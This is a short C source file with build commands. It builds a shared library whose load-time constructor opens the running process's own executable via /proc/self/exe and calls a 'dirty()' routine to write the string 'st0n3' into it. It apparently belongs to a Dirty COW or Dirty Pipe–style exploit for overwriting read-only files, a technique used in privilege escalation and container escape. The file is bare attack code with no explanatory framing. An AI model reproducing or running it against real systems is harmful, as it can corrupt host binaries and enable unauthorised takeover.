//gcc -c -Wall -Werror -fPIC constructor.c
//tcc -shared -o constructor.so constructor.o -Wl,-rpath=/tmp -L/tmp -ldirty

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include "dirty.h"

__attribute__ ((constructor)) void foo(void)
{
    puts("Hello, I am a shared library");
    int fd = open("/proc/self/exe", 0);
    char buf[128];
    snprintf(buf, 128, "/proc/self/fd/%d", fd);
    dirty(buf, "st0n3", 5);
}